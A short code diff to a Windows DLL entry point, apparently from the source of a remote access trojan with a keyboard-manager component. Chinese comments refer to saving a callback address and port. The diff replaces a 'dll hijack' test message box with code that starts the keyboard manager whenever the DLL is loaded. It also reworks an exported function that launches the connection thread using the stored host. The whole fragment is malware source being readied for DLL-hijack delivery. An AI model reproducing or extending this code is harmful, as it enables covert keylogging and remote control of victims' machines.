@@ -211,11 +211,12 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     case DLL_THREAD_ATTACH:
-		//CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
-		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
-		//CKeyboardManager::Initialization();
-		MessageBoxA(0, "dll hijack", "test", 0);
+	{
+		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
+		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
+		CKeyboardManager::Initialization();
 		break;
+	}
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
@@ -225,10 +226,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 
 
-extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
+extern "C" __declspec(dllexport) void TestFun()
 {
-	strcpy(g_strHost, strHost);   // 保存上线地址
-	g_dwPort = nPort;             // 保存上线端口
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
 	//这里等待线程结束
 	WaitForSingleObject(hThread, INFINITE);
